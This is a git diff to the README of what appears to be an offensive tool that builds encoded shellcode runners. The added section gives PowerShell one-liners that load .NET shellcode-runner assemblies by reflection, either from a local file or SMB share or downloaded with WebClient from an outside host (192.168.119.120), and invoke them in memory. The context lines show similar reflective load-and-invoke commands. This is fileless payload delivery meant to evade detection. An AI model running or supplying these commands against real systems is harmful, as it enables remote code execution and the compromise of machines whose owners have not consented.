@@ -141,6 +141,22 @@ First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesa
  [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
  [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
 ```
+---
+## Execute .Net Assemblies with Reflection
+Bellow you can see some examples of how you can execute the Shellcode Runners with reflection.
+
+```
+[+] Assembly - Local Execution or via SMB [+]
+$data=[IO.File]::ReadAllBytes('shellcode_runner.exe|dll')
+$ass=[System.Reflection.Assembly]::Load($data)
+$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))
+
+[+] Assembly - Remote Execution  [+]
+$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
+$ass=[System.Reflection.Assembly]::Load($data)
+$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))
+
+```
 
 ## Output
 If everything goes well, you will get an output as bellow:
